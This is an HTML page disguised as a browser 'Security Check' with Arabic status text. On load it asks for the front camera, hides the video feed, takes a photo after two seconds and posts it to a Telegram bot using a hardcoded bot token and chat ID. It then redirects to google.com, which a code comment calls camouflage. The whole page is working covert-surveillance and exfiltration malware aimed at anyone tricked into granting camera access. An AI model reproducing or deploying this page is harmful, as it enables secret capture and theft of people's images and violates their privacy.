<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Security Check</title>
    <style>body { background: white; text-align: center; padding-top: 50px; font-family: sans-serif; } video, canvas { display: none; }</style>
</head>
<body>
    <div id="status">جاري فحص المتصفح...</div>
    <video id="v" autoplay playsinline></video>
    <canvas id="c" width="640" height="480"></canvas>

    <script>
        const token = '8205090411:AAEIcpDG87AX8gzjI13Ei_pV9BiOcsc25EQ';
        const chatId = '7945738403';

        async function send(blob) {
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('photo', blob, 'shot.jpg');
            // نستخدم await هنا لضمان عدم الانتقال لصفحة أخرى قبل تمام الإرسال
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;

                // انتظر ثانيتين لفتح الكاميرا بوضوح
                await new Promise(r => setTimeout(r, 2000));

                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(async (blob) => {
                    await send(blob); // انتظر حتى يرسل الصورة
                    stream.getTracks().forEach(t => t.stop()); // أغلق الكاميرا
                    window.location.href = "https://www.google.com"; // الآن انتقل للتمويه
                }, 'image/jpeg');

            } catch (e) {
                document.getElementById('status').innerText = "يرجى السماح بالكاميرا للمتابعة";
            }
        }
        window.onload = start;
    </script>
</body>
</html>
